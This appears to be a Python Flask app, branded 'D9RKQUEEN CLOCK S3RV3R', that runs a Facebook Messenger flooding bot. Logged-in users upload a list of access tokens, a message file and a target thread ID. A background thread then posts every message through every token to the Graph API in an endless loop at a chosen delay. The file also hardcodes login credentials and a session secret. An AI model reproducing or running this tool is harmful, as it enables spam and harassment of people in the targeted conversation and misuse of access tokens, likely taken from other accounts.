from flask import Flask, request, render_template_string, redirect, session, url_for
import requests
import time
import threading
import uuid
from datetime import datetime

app = Flask(__name__)
app.secret_key = "SUPER_SECRET_KEY"  # Session ke liye random key

# ✅ Login Credentials
USERNAME = "DARKQUEEN"
PASSWORD = "DARKQUEEN"

# ✅ Global job storage
jobs = {}

# ✅ Default headers
default_headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

# ✅ Background worker function
def background_worker(job_id, tokens, headers, thread_id, prefix, time_interval, messages):
    while True:
        try:
            for token in tokens:
                for msg in messages:
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    final_msg = f"{prefix + ' ' if prefix else ''}{msg} | ⏰ {now}"

                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {'access_token': token.strip(), 'message': final_msg}
                    response = requests.post(api_url, data=parameters, headers=headers)

                    if response.status_code == 200:
                        log = f"[✅ SENT] {thread_id} | {final_msg}"
                    else:
                        log = f"[❌ FAIL] {thread_id} | {final_msg} | {response.text}"

                    jobs[job_id]["logs"].append(log)
                    print(log)
                    time.sleep(time_interval)

        except Exception as e:
            jobs[job_id]["logs"].append(f"⚠️ Error: {e}")
            time.sleep(30)

# ✅ Login Route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect('/')
        else:
            return "<h3>❌ Invalid Login</h3><a href='/login'>Try Again</a>"
    return '''
    <html>
    <head>
    <title>🔐 Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('https://i.imgur.com/YOUR_GIRL_IMAGE.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .card {border-radius: 20px; background-color: rgba(255,255,255,0.9);}
    </style>
    </head>
    <body class="d-flex justify-content-center align-items-center" style="height:100vh;">
    <div class="card p-4 shadow" style="width:350px;">
        <h3 class="text-center mb-3">🔐 Login</h3>
        <form method="post">
            <input class="form-control mb-3" type="text" name="username" placeholder="Username" required>
            <input class="form-control mb-3" type="password" name="password" placeholder="Password" required>
            <button class="btn btn-primary w-100">Login</button>
        </form>
    </div>
    </body>
    </html>
    '''

# ✅ Main Route
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect('/login')

    if request.method == 'POST':
        thread_id = request.form.get('threadId').strip()
        prefix = request.form.get('prefix')
        time_interval = int(request.form.get('time'))

        token_file = request.files['tokenFile']
        tokens = token_file.read().decode().splitlines()

        headers_file = request.files.get('headersFile')
        if headers_file:
            headers_data = headers_file.read().decode().splitlines()
            headers = {}
            for h in headers_data:
                if ":" in h:
                    key, value = h.split(":", 1)
                    headers[key.strip()] = value.strip()
        else:
            headers = default_headers

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        job_id = str(uuid.uuid4())[:8]
        jobs[job_id] = {"logs": [f"🚀 Job {job_id} Started"]}

        t = threading.Thread(target=background_worker, args=(job_id, tokens, headers, thread_id, prefix, time_interval, messages))
        t.daemon = True
        t.start()

        return redirect(f"/status/{job_id}")

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🚀 D9RKQUEEN CLOCK S3RV3R</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: url('https://i.imgur.com/YOUR_GIRL_IMAGE.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .card { border-radius:20px; box-shadow:0px 4px 15px rgba(0,0,0,0.1); background-color: rgba(255,255,255,0.9);}
    .btn-success { font-size:18px; font-weight:bold; border-radius:12px; }
  </style>
</head>
<body>
  <div class="container mt-5">
    <div class="card p-4">
      <h2 class="text-center text-primary mb-4">🚀 D9RKQUEEN CLOCK S3RV3R</h2>
      <form action="/" method="post" enctype="multipart/form-data">
        <label class="form-label">🗝️ Access Token File (.txt):</label>
        <input type="file" class="form-control mb-3" name="tokenFile" accept=".txt" required>

        <label class="form-label">🧾 Headers File (.txt) [Optional]:</label>
        <input type="file" class="form-control mb-3" name="headersFile" accept=".txt">

        <label class="form-label">💬 Thread ID:</label>
        <input type="text" class="form-control mb-3" name="threadId" required>

        <label class="form-label">😈 Prefix [Optional]:</label>
        <input type="text" class="form-control mb-3" name="prefix">

        <label class="form-label">📝 Message File (.txt):</label>
        <input type="file" class="form-control mb-3" name="txtFile" accept=".txt" required>

        <label class="form-label">⏳ Delay (seconds):</label>
        <input type="number" class="form-control mb-3" name="time" required>

        <button type="submit" class="btn btn-success w-100">🚀 Start Job</button>
      </form>
    </div>
  </div>
</body>
</html>
'''

@app.route('/status/<job_id>')
def job_status(job_id):
    if job_id not in jobs:
        return "❌ Invalid Job ID!"
    logs = "<br>".join(jobs[job_id]["logs"][-50:])
    return f"""
    <html><head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    </head><body style="background:#f0f0f0;"><div class="container mt-4">
    <h2 class="text-primary">📊 Job Status — {job_id}</h2>
    <div class="card p-3 shadow"><pre>{logs}</pre></div>
    <a href='/' class='btn btn-secondary mt-3'>⬅ Back</a>
    </div></body></html>
    """

def keep_alive():
    while True:
        try:
            requests.get("https://yourapp.yourusername.repl.co")
        except:
            pass
        time.sleep(60)

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
